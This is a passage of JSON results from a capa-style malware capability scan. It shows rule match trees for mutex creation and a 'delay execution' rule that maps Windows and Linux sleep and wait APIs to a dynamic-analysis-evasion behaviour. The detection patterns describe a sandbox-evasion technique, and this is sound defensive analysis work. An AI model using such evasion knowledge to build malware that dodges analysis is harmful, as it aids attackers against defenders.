            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "OpenMutex"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651789357
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateMutex"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateMutexEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "format",
                          "format": "dotnet"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::ctor"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::OpenExisting"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::TryOpenExisting"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651789662
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "OpenMutex"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651789662
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateMutex"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateMutexEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "format",
                          "format": "dotnet"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::ctor"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::OpenExisting"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::TryOpenExisting"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651792144
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "OpenMutex"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateMutex"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651792144
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateMutexEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "format",
                          "format": "dotnet"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::ctor"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::OpenExisting"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::TryOpenExisting"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651792633
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "OpenMutex"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateMutex"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651792633
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateMutexEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenMutant"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "format",
                          "format": "dotnet"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::ctor"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::OpenExisting"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Mutex::TryOpenExisting"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "delay execution": {
        "meta": {
          "name": "delay execution",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "@ramen0x3f"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Anti-Behavioral Analysis",
                "Dynamic Analysis Evasion",
                "Delayed Execution"
              ],
              "objective": "Anti-Behavioral Analysis",
              "behavior": "Dynamic Analysis Evasion",
              "method": "Delayed Execution",
              "id": "B0003.003"
            }
          ],
          "references": [
            "https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions",
            "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp"
          ],
          "examples": [
            "al-khaser_x86.exe_:0x449770",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402FA6"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: delay execution\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - \"@ramen0x3f\"\r\n    lib: true\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Anti-Behavioral Analysis::Dynamic Analysis Evasion::Delayed Execution [B0003.003]\r\n    references:\r\n      - https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions\r\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp\r\n    examples:\r\n      - al-khaser_x86.exe_:0x449770\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402FA6\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - or:\r\n          - api: kernel32.Sleep\r\n          - api: kernel32.SleepEx\r\n          - api: kernel32.WaitForSingleObject\r\n          - api: kernel32.SignalObjectAndWait\r\n          - api: kernel32.WaitForSingleObjectEx\r\n          - api: kernel32.WaitForMultipleObjects\r\n          - api: kernel32.WaitForMultipleObjectsEx\r\n          - api: kernel32.RegisterWaitForSingleObject\r\n          - api: WaitOnAddress\r\n          - api: user32.MsgWaitForMultipleObjects\r\n          - api: user32.MsgWaitForMultipleObjectsEx\r\n          - api: NtDelayExecution\r\n          - api: KeWaitForSingleObject\r\n          - api: KeDelayExecutionThread\r\n      - and:\r\n        - or:\r\n          - os: linux\r\n          - os: android\r\n        - or:\r\n          - api: sleep\r\n          - api: usleep\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651773528
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651773533
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651773657
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651773662
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651774472
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651774477
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651785936
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651785949
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
